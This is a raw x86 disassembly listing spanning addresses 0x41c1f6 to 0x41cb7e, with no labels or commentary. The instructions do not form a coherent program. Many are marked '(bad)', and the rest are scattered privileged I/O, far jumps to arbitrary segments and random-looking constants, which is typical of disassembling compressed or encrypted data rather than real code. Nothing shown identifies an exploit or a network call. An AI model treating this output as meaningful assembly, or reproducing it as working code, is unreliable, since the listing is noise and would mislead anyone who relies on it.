  41c1f6:	outs   dx,BYTE PTR ds:[esi]
  41c1f7:	xor    DWORD PTR [edx+0x2],edx
  41c1fa:	jg     0x41c243
  41c1fc:	xor    ebp,edi
  41c1fe:	rcl    DWORD PTR [ebp-0x41],1
  41c201:	push   ecx
  41c202:	mov    ebx,0x70bed0a9
  41c207:	repnz in eax,dx
  41c209:	repz cmp bh,bl
  41c20c:	inc    ebx
  41c20d:	out    0x53,eax
  41c20f:	fild   WORD PTR [esi-0x311bdab]
  41c215:	xchg   ecx,eax
  41c216:	fwait
  41c217:	inc    edx
  41c218:	inc    eax
  41c219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c21a:	imul   ebx,DWORD PTR [ebx],0x3c
  41c21d:	mov    edi,0x7eda16ea
  41c222:	pop    ebx
  41c223:	dec    edi
  41c224:	rol    BYTE PTR [edx+0x45],1
  41c227:	scas   eax,DWORD PTR es:[edi]
  41c228:	cmp    eax,DWORD PTR [ecx]
  41c22a:	xor    al,BYTE PTR [ebp+ebp*4+0x4c]
  41c22e:	test   eax,0xa369b348
  41c233:	mov    ecx,0xef2cc831
  41c238:	dec    eax
  41c239:	push   ecx
  41c23a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c23b:	jb     0x41c282
  41c23d:	xor    eax,0xd14d6039
  41c242:	repz and edx,ebx
  41c245:	jno    0x41c280
  41c247:	int    0xf3
  41c249:	mov    ds:0xa59a2f78,al
  41c24e:	mov    ds:0xbf99de77,eax
  41c253:	jmp    0x2185:0x196582ee
  41c25a:	pusha  
  41c25b:	xchg   edi,eax
  41c25c:	push   cs
  41c25d:	aam    0xab
  41c25f:	inc    ebx
  41c260:	test   eax,0x21bc51b1
  41c265:	pop    ecx
  41c266:	mov    edx,0x9e190c18
  41c26b:	mov    al,ds:0x9c20cbe3
  41c270:	daa    
  41c271:	sbb    DWORD PTR [edi+edx*8-0x7ce77572],ecx
  41c278:	shr    ebx,0xe2
  41c27b:	sbb    eax,0xd7bd68cd
  41c280:	je     0x41c2c0
  41c282:	ins    DWORD PTR es:[edi],dx
  41c283:	xor    dh,BYTE PTR [edx]
  41c285:	fiadd  DWORD PTR [esi-0x3bf33de8]
  41c28b:	out    dx,eax
  41c28c:	je     0x41c234
  41c28e:	pop    edx
  41c28f:	add    esi,DWORD PTR [eax]
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41c302:	xchg   ecx,eax
  41c303:	push   esi
  41c304:	xchg   esp,eax
  41c305:	sub    eax,DWORD PTR [ecx]
  41c307:	add    BYTE PTR ds:0x6c000001,al
  41c30d:	xchg   esi,eax
  41c30e:	mov    ebp,DWORD PTR [edx+0x676fd91e]
  41c314:	stc    
  41c315:	add    DWORD PTR [edx],0x1e
  41c318:	xor    cl,BYTE PTR [ebp+0x75]
  41c31b:	xchg   esp,eax
  41c31c:	fs jecxz 0x41c2db
  41c31f:	es mov ah,0x9
  41c322:	call   0x8a2295f7
  41c327:	mov    WORD PTR ds:0xeccba5c0,?
  41c32d:	cld    
  41c32e:	sbb    eax,0x54a3a0db
  41c333:	push   0x14c86e51
  41c338:	add    edx,DWORD PTR [ebx]
  41c33a:	(bad)  
  41c33b:	and    BYTE PTR [ebp+0x43b0f89d],cl
  41c341:	test   al,0x7c
  41c343:	(bad)  
  41c344:	or     ebp,DWORD PTR [eax+0x36d9461e]
  41c34a:	xor    ebx,DWORD PTR [eax-0x4]
  41c34d:	xchg   edx,eax
  41c34e:	shr    DWORD PTR [edi+ebp*8-0x461f2a3f],1
  41c355:	inc    esi
  41c356:	sub    eax,0x9c5ceb6c
  41c35b:	push   ebp
  41c35c:	out    dx,eax
  41c35d:	adc    esp,DWORD PTR [ebx]
  41c35f:	or     bl,BYTE PTR [eax-0x67]
  41c362:	lahf   
  41c363:	imul   ebp,DWORD PTR [esi+edi*8],0xffffff8a
  41c367:	popf   
  41c368:	and    ecx,DWORD PTR [ecx-0x80]
  41c36b:	mov    esp,0x1159eb3a
  41c371:	push   esp
  41c372:	pop    es
  41c373:	fld    QWORD PTR [ebx-0x1c17b32a]
  41c379:	mov    bl,0xe5
  41c37b:	sti    
  41c37c:	into   
  41c37d:	dec    esi
  41c37e:	fdivr  DWORD PTR [edi]
  41c380:	push   ss
  41c381:	pop    ebx
  41c382:	clc    
  41c383:	fmul   st,st(4)
  41c385:	in     eax,0xbc
  41c387:	xchg   ebx,eax
  41c388:	fadd   QWORD PTR [edi]
  41c38a:	xchg   ecx,eax
  41c38b:	fchs   
  41c38d:	cld    
  41c38e:	repnz out 0xcc,eax
  41c391:	mov    dh,0x71
  41c393:	dec    esp
  41c394:	and    BYTE PTR [edx],dh
  41c396:	cmp    dl,0x7a
  41c399:	pop    esi
  41c39a:	js     0x41c342
  41c39c:	mov    ebx,0xe26755e8
  41c3a1:	in     eax,dx
  41c3a2:	pop    ebx
  41c3a3:	push   cs
  41c3a4:	ror    BYTE PTR [edx],cl
  41c3a6:	retf   0x9429
  41c3a9:	lahf   
  41c3aa:	paddd  mm0,mm2
  41c3ad:	(bad)  
  41c3ae:	xor    al,0x8d
  41c3b0:	hlt    
  41c3b1:	mov    bl,0x10
  41c3b3:	aad    0xf2
  41c3b5:	shl    DWORD PTR [eax+0x5050f1e7],cl
  41c3bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3bc:	loop   0x41c39b
  41c3be:	pop    edx
  41c3bf:	mov    ds:0x92eeece4,eax
  41c3c4:	jb     0x41c413
  41c3c6:	call   0xcb4:0xb10bb4c4
  41c3cd:	int    0x50
  41c3cf:	lock jb 0x41c431
  41c3d2:	call   0x1520:0xcbcdc6f6
  41c3d9:	xchg   bl,cl
  41c3db:	pop    edi
  41c3dc:	(bad)  
  41c3dd:	(bad)  
  41c3de:	ss pop ebx
  41c3e0:	mov    edi,0x8c9b1acb
  41c3e5:	jo     0x41c3f4
  41c3e7:	mov    ecx,0x1e568bae
  41c3ec:	xor    bl,BYTE PTR [eax-0x61]
  41c3ef:	ror    BYTE PTR [ebx+0x5d],cl
  41c3f2:	rcr    BYTE PTR [esi-0xe],1
  41c3f5:	jle    0x41c446
  41c3f7:	push   ss
  41c3f8:	not    al
  41c3fa:	mov    BYTE PTR [esi-0x65],ah
  41c3fd:	mov    BYTE PTR [ebx],cl
  41c3ff:	fstp   QWORD PTR [edi+0x54]
  41c402:	sub    dh,BYTE PTR [esi+ebx*8-0x535264d4]
  41c409:	and    BYTE PTR [edx],0xd1
  41c40c:	out    0x6d,eax
  41c40e:	sbb    ebp,DWORD PTR [edx]
  41c410:	sbb    eax,DWORD PTR [eax]
	...
  41c472:	add    BYTE PTR [eax],al
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	loop   0x41c46b
  41c482:	cs xor al,0x99
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR ds:0xef000001,al
  41c48d:	cmp    al,0xb5
  41c48f:	fistp  DWORD PTR [ecx+ecx*2+0x6d88ebd6]
  41c496:	mov    bl,0x4f
  41c498:	test   BYTE PTR [eax-0x7c],dh
  41c49b:	mov    ebp,0xc89c3f79
  41c4a0:	mov    ds:0x52517a7a,eax
  41c4a5:	mov    eax,ds:0x5510e791
  41c4aa:	sar    esp,1
  41c4ac:	and    al,0x8e
  41c4ae:	cli    
  41c4af:	pushf  
  41c4b0:	in     eax,dx
  41c4b1:	jnp    0x41c478
  41c4b3:	xor    al,BYTE PTR [edi+0x13]
  41c4b6:	xlat   BYTE PTR ds:[ebx]
  41c4b7:	fnstcw WORD PTR [ebp+ecx*1+0x4fdb0bb0]
  41c4be:	jp     0x41c51a
  41c4c0:	mov    dh,0x66
  41c4c2:	pop    es
  41c4c3:	in     eax,dx
  41c4c4:	push   ebx
  41c4c5:	(bad)  
  41c4c6:	push   ss
  41c4c7:	lea    edi,[eax-0xb]
  41c4ca:	xor    eax,DWORD PTR [ecx+esi*2]
  41c4cd:	sub    BYTE PTR [ebp+0x42],dl
  41c4d0:	sub    eax,0xf8e3e1e6
  41c4d5:	popa   
  41c4d6:	mov    esi,0xee3efff7
  41c4db:	std    
  41c4dc:	ss jno 0x41c4c3
  41c4df:	clc    
  41c4e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4e1:	popa   
  41c4e2:	std    
  41c4e3:	mov    al,ds:0xbeb382a1
  41c4e8:	fsub   QWORD PTR [eax+0x4578f9a6]
  41c4ee:	sub    edi,esi
  41c4f0:	add    DWORD PTR [ecx+0xd],ebp
  41c4f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4f4:	push   0xffffff8a
  41c4f6:	ret    
  41c4f7:	cmp    dl,ah
  41c4f9:	mov    edx,0x6a78e4cd
  41c4fe:	imul   eax,DWORD PTR cs:[ecx],0x36210392
  41c505:	dec    edx
  41c506:	scas   al,BYTE PTR es:[edi]
  41c507:	(bad)  
  41c508:	shl    DWORD PTR [ebx-0x18e28cdc],cl
  41c50e:	or     ecx,DWORD PTR [ecx-0x28]
  41c511:	mov    ah,bl
  41c513:	pusha  
  41c514:	xchg   esp,eax
  41c515:	ja     0x41c556
  41c517:	cmp    al,0xcf
  41c519:	into   
  41c51a:	pop    edi
  41c51b:	cmp    bh,BYTE PTR [edx+ecx*8-0x72]
  41c51f:	xchg   ebp,eax
  41c520:	jmp    0x41c555
  41c522:	jo     0x41c53b
  41c524:	pop    ds
  41c525:	cdq    
  41c526:	jp     0x41c4ef
  41c528:	push   0xb961d48c
  41c52d:	cmp    ch,BYTE PTR [edx-0x1b]
  41c530:	mov    ds:0xf8472729,eax
  41c535:	add    ebp,DWORD PTR [edx]
  41c537:	add    edi,DWORD PTR [ebp-0x46]
  41c53a:	lahf   
  41c53b:	sub    DWORD PTR [ebp+0x6659d35e],edi
  41c541:	mov    cl,0xef
  41c543:	leave  
  41c544:	cld    
  41c545:	adc    al,0xc5
  41c547:	mov    BYTE PTR [ebp-0x4f591f6b],cl
  41c54d:	add    eax,0x66990ac0
  41c552:	add    DWORD PTR [ecx+0x2df57f0b],ebp
  41c558:	gs jecxz 0x41c5b1
  41c55b:	mov    ds:0x4f1f7d40,al
  41c560:	push   eax
  41c561:	jmp    0x41c53c
  41c563:	lods   eax,DWORD PTR ds:[esi]
  41c564:	popa   
  41c565:	(bad)  
  41c566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c567:	je     0x41c5a1
  41c569:	push   cs
  41c56a:	test   cl,dl
  41c56c:	sar    BYTE PTR [esi],1
  41c56e:	retf   
  41c56f:	add    al,0x9f
  41c571:	add    esi,eax
  41c573:	shl    BYTE PTR [edx-0x3d],1
  41c576:	fstp   DWORD PTR [edi+ebp*2]
  41c579:	xor    eax,0x982ca3e3
  41c57e:	ficomp DWORD PTR [edx]
  41c580:	xchg   ebp,eax
  41c581:	pop    edx
  41c582:	jae    0x41c5ca
  41c584:	and    al,BYTE PTR [esi+0xac5b638]
  41c58a:	jae    0x41c526
  41c58c:	ins    DWORD PTR es:[edi],dx
  41c58d:	cmc    
  41c58e:	(bad)  [ebp+0xc8]
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0x603510b1
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0x1000001
  41c60d:	rcl    DWORD PTR [esi+edx*2-0x1c508d60],cl
  41c614:	adc    esi,DWORD PTR [ecx*8+0x6235f96]
  41c61b:	cmp    BYTE PTR [ecx+0x4816a069],bh
  41c621:	mov    esi,0x4fcda06a
  41c626:	jne    0x41c64d
  41c628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c629:	push   ss
  41c62a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c62b:	xchg   edi,eax
  41c62c:	loope  0x41c67e
  41c62e:	imul   ecx,esi,0xfffffff1
  41c631:	fwait
  41c632:	ja     0x41c648
  41c634:	push   ss
  41c635:	cdq    
  41c636:	pop    ebp
  41c637:	jl     0x41c681
  41c639:	mov    ecx,0xe2173b10
  41c63e:	push   ds
  41c63f:	repnz aad 0xa7
  41c642:	cmp    dh,BYTE PTR [ecx]
  41c644:	out    dx,eax
  41c645:	icebp  
  41c646:	dec    esi
  41c647:	or     dh,BYTE PTR ds:0xc70bc6d8
  41c64d:	sub    eax,0xa1f23e52
  41c652:	jno    0x41c5e8
  41c654:	dec    ebx
  41c655:	jo     0x41c5fc
  41c657:	call   0x10d3:0x10fdc073
  41c65e:	pop    ebp
  41c65f:	dec    edx
  41c660:	inc    edi
  41c661:	xor    al,0x96
  41c663:	xchg   ecx,eax
  41c664:	lods   eax,DWORD PTR ds:[esi]
  41c665:	ja     0x41c68a
  41c667:	push   ebx
  41c668:	mov    al,0x1f
  41c66a:	fcom   DWORD PTR [ebp-0xa2dbbc2]
  41c670:	test   DWORD PTR [ebp+0x2ee1b712],edi
  41c676:	cmp    BYTE PTR [ebx+0x41],ah
  41c679:	scas   eax,DWORD PTR es:[edi]
  41c67a:	sahf   
  41c67b:	sahf   
  41c67c:	push   es
  41c67d:	ja     0x41c6a0
  41c67f:	scas   eax,DWORD PTR es:[edi]
  41c680:	mov    ds:0x4a70f417,eax
  41c685:	repnz sbb esp,eax
  41c688:	arpl   WORD PTR [ebx-0x3e],sp
  41c68b:	cwde   
  41c68c:	push   edi
  41c68d:	jp     0x41c681
  41c68f:	(bad)  
  41c690:	in     al,0xb5
  41c692:	sub    esp,DWORD PTR ss:[ecx+0xa]
  41c696:	push   ds
  41c697:	popa   
  41c698:	cmp    BYTE PTR [ecx+0x6f],bh
  41c69b:	dec    edi
  41c69c:	xchg   ebp,eax
  41c69d:	lahf   
  41c69e:	push   esp
  41c69f:	stos   DWORD PTR es:[edi],eax
  41c6a0:	mov    eax,0x4a123429
  41c6a5:	pop    ss
  41c6a6:	and    ecx,DWORD PTR [ebp+0x33235522]
  41c6ac:	pusha  
  41c6ad:	ficomp WORD PTR [edx+ebx*8-0x41]
  41c6b1:	mov    DWORD PTR [ebp+0x61783dab],ebp
  41c6b7:	dec    ebp
  41c6b8:	shl    ah,0x7d
  41c6bb:	jl     0x41c6c2
  41c6bd:	sbb    eax,DWORD PTR [ecx+0x5f]
  41c6c0:	mov    dl,0xe0
  41c6c2:	push   ss
  41c6c3:	mov    ecx,0x7323b0a8
  41c6c8:	retf   0xa3fe
  41c6cb:	pop    es
  41c6cc:	jne    0x41c72f
  41c6ce:	lock pop es
  41c6d0:	popf   
  41c6d1:	push   esi
  41c6d2:	lods   eax,DWORD PTR ds:[esi]
  41c6d3:	add    DWORD PTR [ecx],esi
  41c6d5:	mov    ds:0xf1aa5c42,eax
  41c6da:	out    0x46,al
  41c6dc:	adc    BYTE PTR [ecx],ah
  41c6de:	int    0x90
  41c6e0:	jnp    0x41c6aa
  41c6e2:	dec    BYTE PTR [esi-0x9]
  41c6e5:	push   ebp
  41c6e6:	cmc    
  41c6e7:	out    dx,eax
  41c6e8:	ror    DWORD PTR [edx-0x57d15515],1
  41c6ee:	xchg   ebp,eax
  41c6ef:	ins    DWORD PTR es:[edi],dx
  41c6f0:	mov    ah,0x91
  41c6f2:	call   0xb34393cc
  41c6f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6f8:	or     BYTE PTR [eax-0x202e038c],dl
  41c6fe:	xor    BYTE PTR [ecx-0x5f],al
  41c701:	shl    BYTE PTR [eax],1
  41c703:	push   cs
  41c704:	mov    esi,DWORD PTR [ebp-0x32d59bf4]
  41c70a:	cld    
  41c70b:	aam    0xb7
  41c70d:	cmp    al,0xd4
  41c70f:	xor    al,0xf9
	...
  41c771:	add    BYTE PTR [eax],al
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	cmp    edx,eax
  41c782:	and    esi,DWORD PTR [eax+0x12ea3]
  41c788:	add    eax,0xaa000001
  41c78d:	test   al,0x10
  41c78f:	je     0x41c7db
  41c791:	adc    edi,DWORD PTR [edi+0x13]
  41c794:	pop    esi
  41c795:	pop    edi
  41c796:	inc    esp
  41c797:	push   edx
  41c798:	pop    es
  41c799:	aam    0x82
  41c79b:	mov    edi,DWORD PTR [edi*1+0x132f83a1]
  41c7a2:	je     0x41c7ab
  41c7a4:	xchg   edi,eax
  41c7a5:	mov    ah,0x48
  41c7a7:	test   cl,dl
  41c7a9:	mov    al,0xb8
  41c7ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7ac:	(bad)  
  41c7ad:	cmp    DWORD PTR [ebx],esi
  41c7af:	fyl2xp1 
  41c7b1:	inc    edi
  41c7b2:	mov    eax,ds:0x278e9835
  41c7b7:	clc    
  41c7b8:	push   esp
  41c7b9:	fcomp  st(1)
  41c7bb:	fsub   st,st(1)
  41c7bd:	rol    BYTE PTR [ecx],cl
  41c7bf:	pop    ss
  41c7c0:	cmp    eax,0xe27b6c42
  41c7c5:	mov    DWORD PTR [edi+0x11],ebx
  41c7c8:	jns    0x41c81c
  41c7ca:	push   0xfffffff2
  41c7cc:	out    dx,eax
  41c7cd:	shl    DWORD PTR [ebx+edi*4],1
  41c7d0:	cmc    
  41c7d1:	sbb    BYTE PTR ds:0xd4ef5d0b,0xb
  41c7d8:	jmp    DWORD PTR [ecx*8+0x71d9520a]
  41c7df:	mov    ch,0x1c
  41c7e1:	jbe    0x41c845
  41c7e3:	shl    DWORD PTR [ecx-0x16120ffe],1
  41c7e9:	mov    esp,DWORD PTR [edx-0x5]
  41c7ec:	push   0x71
  41c7ee:	pop    edx
  41c7ef:	es addr16 (bad) 
  41c7f2:	dec    ebx
  41c7f3:	call   0xf110501b
  41c7f8:	outs   dx,DWORD PTR ds:[esi]
  41c7f9:	div    DWORD PTR ds:0x3d69f158
  41c7ff:	and    DWORD PTR [esi],edi
  41c801:	retf   
  41c802:	mov    fs,WORD PTR [edx+0x29]
  41c805:	aad    0x95
  41c807:	push   0x78e4ab64
  41c80c:	vmwrite edi,DWORD PTR [ebp-0x37]
  41c810:	jl     0x41c873
  41c812:	scas   al,BYTE PTR es:[edi]
  41c813:	push   esp
  41c814:	in     al,0x44
  41c816:	xor    eax,0x7ac945ae
  41c81b:	inc    ebp
  41c81c:	sub    cl,BYTE PTR [esi]
  41c81e:	test   al,0xae
  41c820:	mov    ds:0xd169d764,eax
  41c825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c826:	sti    
  41c827:	push   edx
  41c828:	sbb    eax,0x8d045900
  41c82d:	lea    esi,[ebp+0x2b]
  41c830:	aas    
  41c831:	adc    eax,0xeac28d35
  41c836:	rcl    BYTE PTR [esi],1
  41c838:	imul   ebx,DWORD PTR [esi+edx*8-0x42],0x7c232b10
  41c840:	xchg   edi,eax
  41c841:	pop    esi
  41c842:	ret    0xbce4
  41c845:	jmp    0x41c87f
  41c847:	je     0x41c829
  41c849:	aad    0x59
  41c84b:	jg     0x41c7ea
  41c84d:	xlat   BYTE PTR ds:[ebx]
  41c84e:	retf   0x6850
  41c851:	(bad)  
  41c852:	pop    edi
  41c853:	mov    edi,0xebf57879
  41c858:	pop    eax
  41c859:	jbe    0x41c8cc
  41c85b:	retf   0x6a32
  41c85e:	dec    eax
  41c85f:	stc    
  41c860:	jmp    0x4076a1a7
  41c865:	cli    
  41c866:	dec    eax
  41c867:	jae    0x41c8db
  41c869:	repz daa 
  41c86b:	mov    al,ds:0x9f5523db
  41c870:	mov    ecx,0x13c14654
  41c875:	and    ebx,DWORD PTR [ebp-0x54]
  41c878:	push   eax
  41c879:	and    DWORD PTR [ecx],edi
  41c87b:	(bad)  
  41c87c:	out    0xb7,al
  41c87e:	aas    
  41c87f:	and    eax,0x317031c3
  41c884:	inc    edi
  41c885:	jmp    0x1064:0x55c7e71
  41c88c:	adc    DWORD PTR [esi+0x38a20f],ecx
	...
  41c8f2:	add    BYTE PTR [eax],al
  41c8f4:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c8fb:	ja     0x41c915
  41c8fd:	sub    DWORD PTR [ebx],edi
  41c8ff:	add    DWORD PTR [edx-0x578e90bb],edi
  41c905:	das    
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    eax,0xef000001
  41c90d:	pop    eax
  41c90e:	fist   WORD PTR [ebp-0x37ae9241]
  41c914:	loop   0x41c8c1
  41c916:	retf   
  41c917:	push   0x29
  41c919:	sub    ch,dh
  41c91b:	nop
  41c91c:	scas   al,BYTE PTR es:[edi]
  41c91d:	mov    edi,0x303dc1ff
  41c922:	adc    dh,bh
  41c924:	pop    ebx
  41c925:	and    al,0x27
  41c927:	in     al,dx
  41c928:	bound  eax,QWORD PTR [ecx]
  41c92a:	dec    ebp
  41c92b:	push   edx
  41c92c:	push   es
  41c92d:	rol    BYTE PTR [eax+edi*4],cl
  41c930:	add    eax,0xd5b85386
  41c935:	in     eax,dx
  41c936:	(bad)  
  41c937:	jo     0x41c9a1
  41c939:	test   al,0x6c
  41c93b:	or     eax,0xc5e615b8
  41c940:	dec    ebx
  41c941:	out    dx,al
  41c942:	mov    bh,al
  41c944:	fiadd  DWORD PTR [ebp+0x46]
  41c947:	imul   DWORD PTR [ebp+0x55]
  41c94a:	sub    edx,esi
  41c94c:	shl    BYTE PTR ds:0x8d60467d,cl
  41c952:	loope  0x41c8da
  41c954:	or     BYTE PTR [ecx-0xf9ff31b],dh
  41c95a:	mov    bh,0xe0
  41c95c:	cmp    dh,ch
  41c95e:	rcr    DWORD PTR fs:[ecx+0x5c],1
  41c962:	ret    0xa9c0
  41c965:	jle    0x41c904
  41c967:	ror    ah,0x9f
  41c96a:	adc    edi,DWORD PTR [eax+0x6c]
  41c96d:	sub    DWORD PTR [eax],ebx
  41c96f:	mov    dh,BYTE PTR [ebx+ecx*1-0x24b1a40b]
  41c976:	nop
  41c977:	xlat   BYTE PTR ds:[ebx]
  41c978:	push   cs
  41c979:	lahf   
  41c97a:	ficom  WORD PTR [eax-0x376901a0]
  41c980:	test   al,0x63
  41c982:	scas   al,BYTE PTR es:[edi]
  41c983:	dec    esp
  41c984:	ret    0x41b2
  41c987:	mov    edi,0xe4193bc
  41c98c:	push   ebx
  41c98d:	icebp  
  41c98e:	mov    al,0x8b
  41c990:	ins    BYTE PTR es:[edi],dx
  41c991:	repz or DWORD PTR [ecx+0x5cb708c],ecx
  41c998:	rcl    BYTE PTR [ebp+0x52],1
  41c99b:	jp     0x41c953
  41c99d:	test   DWORD PTR [eax+0x45df2cb9],eax
  41c9a3:	(bad)
  41c9a8:	dec    esi
  41c9a9:	arpl   dx,sp
  41c9ab:	es fs dec ebx
  41c9ae:	xchg   edi,eax
  41c9af:	or     eax,0x9f378b1d
  41c9b4:	pop    eax
  41c9b5:	das    
  41c9b6:	ror    ebp,cl
  41c9b8:	ss lahf 
  41c9ba:	adc    al,0xb6
  41c9bc:	cmp    DWORD PTR [edx+ebp*2],ebx
  41c9bf:	dec    edx
  41c9c0:	push   0xffffff8d
  41c9c2:	test   eax,0xe6dab646
  41c9c7:	frstor [eax]
  41c9c9:	inc    ebp
  41c9ca:	mov    ds:0x7fd35ce4,al
  41c9cf:	loope  0x41c9e4
  41c9d1:	leave  
  41c9d2:	in     eax,dx
  41c9d3:	sbb    BYTE PTR [eax-0xd],ah
  41c9d6:	xor    eax,0x14f20524
  41c9db:	xor    DWORD PTR [edx+ebp*8],ecx
  41c9de:	sbb    eax,0xb36a0ff4
  41c9e3:	fwait
  41c9e4:	pop    edx
  41c9e5:	ins    BYTE PTR es:[edi],dx
  41c9e6:	xchg   ecx,eax
  41c9e7:	cld    
  41c9e8:	lds    ebx,FWORD PTR [ebp+0x3fe43f38]
  41c9ee:	and    edx,0x31
  41c9f1:	mov    dl,0xf
  41c9f3:	mov    cl,0x21
  41c9f5:	push   ds
  41c9f6:	xor    ebx,DWORD PTR [edi]
  41c9f8:	ds xchg edi,eax
  41c9fa:	das    
  41c9fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9fc:	aaa    
  41c9fd:	jecxz  0x41ca60
  41c9ff:	rcl    BYTE PTR [ebp-0x79],cl
  41ca02:	ja     0x41c9d3
  41ca04:	push   ebp
  41ca05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca06:	push   cs
  41ca07:	mov    edi,0xefa70928
  41ca0c:	bound  ecx,QWORD PTR [eax]
  41ca0e:	push   edx
  41ca0f:	pop    ss
  41ca10:	pop    ds
	...
  41ca71:	add    BYTE PTR [eax],al
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	imul   eax,DWORD PTR [edx+0x0],0x14
  41ca84:	lods   eax,DWORD PTR ds:[esi]
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR ds:0x68000001,al
  41ca8d:	out    0xf2,eax
  41ca8f:	les    eax,FWORD PTR [esi]
  41ca91:	fsubr  DWORD PTR [edx-0x5a302066]
  41ca97:	ins    BYTE PTR es:[edi],dx
  41ca98:	retf   
  41ca99:	adc    ecx,DWORD PTR [edi]
  41ca9b:	imul   ebp,DWORD PTR [esi+0x36],0x40
  41ca9f:	ds inc ebp
  41caa1:	push   esi
  41caa2:	inc    BYTE PTR ds:0xbd7d69fa
  41caa8:	jb     0x41cb0c
  41caaa:	stc    
  41caab:	push   eax
  41caac:	outs   dx,DWORD PTR ds:[esi]
  41caad:	fidivr WORD PTR [ecx-0x7]
  41cab0:	push   es
  41cab1:	enter  0xb91,0xeb
  41cab5:	jmp    0x41cb0b
  41cab7:	or     al,BYTE PTR [ebx]
  41cab9:	adc    al,0x9c
  41cabb:	xlat   BYTE PTR ds:[ebx]
  41cabc:	outs   dx,DWORD PTR ds:[esi]
  41cabd:	mov    eax,0x52b8ca03
  41cac2:	adc    eax,0x2de4d8d0
  41cac7:	and    edi,DWORD PTR [eax]
  41cac9:	dec    edx
  41caca:	sbb    eax,0x3b6b0fdb
  41cacf:	dec    eax
  41cad0:	and    bh,BYTE PTR es:[ecx-0x39d91377]
  41cad7:	cmp    DWORD PTR [esi-0x76],edi
  41cada:	jl     0x41cb41
  41cadc:	pop    ebp
  41cadd:	or     al,0x31
  41cadf:	data16 daa 
  41cae1:	cmp    ecx,ebp
  41cae3:	addr16 cdq 
  41cae5:	mov    esi,0xc48acb46
  41caea:	enter  0xa30a,0x82
  41caee:	jnp    0x41cb55
  41caf0:	sub    DWORD PTR [ecx+0x3854bb5d],ecx
  41caf6:	sbb    cl,BYTE PTR [edx-0x7e]
  41caf9:	jmp    0x6914:0x6ec99596
  41cb00:	ins    BYTE PTR es:[edi],dx
  41cb01:	xchg   esi,eax
  41cb02:	imul   esi,DWORD PTR [esi+0x6a4b7a42],0x72
  41cb09:	jmp    0xfe336785
  41cb0e:	pop    ds
  41cb0f:	jmp    0x3c23adfe
  41cb14:	push   ecx
  41cb15:	mov    cl,0x35
  41cb17:	pushf  
  41cb18:	cld    
  41cb19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb1a:	test   al,0xb9
  41cb1c:	out    dx,eax
  41cb1d:	out    dx,eax
  41cb1e:	dec    esi
  41cb1f:	pusha  
  41cb20:	sbb    esi,DWORD PTR [esi]
  41cb22:	(bad)  
  41cb23:	xor    al,0x79
  41cb25:	fwait
  41cb26:	(bad)  
  41cb27:	lods   al,BYTE PTR ds:[esi]
  41cb28:	push   eax
  41cb29:	repz dec esp
  41cb2b:	sub    al,0xd0
  41cb2d:	loope  0x41cb5d
  41cb2f:	mov    esi,0xa7daaa37
  41cb34:	push   esi
  41cb35:	jnp    0x41cb45
  41cb37:	out    dx,eax
  41cb38:	cmp    al,0xb1
  41cb3a:	jno    0x41caf5
  41cb3c:	fsubr  DWORD PTR [ebp+0x7437f36f]
  41cb42:	in     eax,0xac
  41cb44:	dec    esp
  41cb45:	cwde   
  41cb46:	aas    
  41cb47:	dec    esi
  41cb48:	outs   dx,DWORD PTR ds:[esi]
  41cb49:	jp     0x41cb54
  41cb4b:	shl    BYTE PTR [edi+0x5b477942],1
  41cb51:	xchg   edx,eax
  41cb52:	jo     0x41cb8e
  41cb54:	inc    ebx
  41cb55:	dec    ebp
  41cb56:	xchg   edi,eax
  41cb57:	jl     0x41cbd0
  41cb59:	loope  0x41cb62
  41cb5b:	fs push ebx
  41cb5d:	gs push ss
  41cb5f:	(bad)  
  41cb60:	push   ds
  41cb61:	lods   eax,DWORD PTR cs:[esi]
  41cb63:	mov    BYTE PTR [ebx],0xd
  41cb66:	and    al,0x19
  41cb68:	gs mov ebp,0xd96ccc85
  41cb6e:	sahf   
  41cb6f:	jnp    0x41cafc
  41cb71:	mov    dl,0xed
  41cb73:	bound  esp,QWORD PTR [ebx]
  41cb75:	sub    edi,DWORD PTR [esi]
  41cb77:	mov    BYTE PTR [edx],cl
  41cb79:	(bad)
  41cb7d:	in     al,dx
  41cb7e:	or     eax,ecx
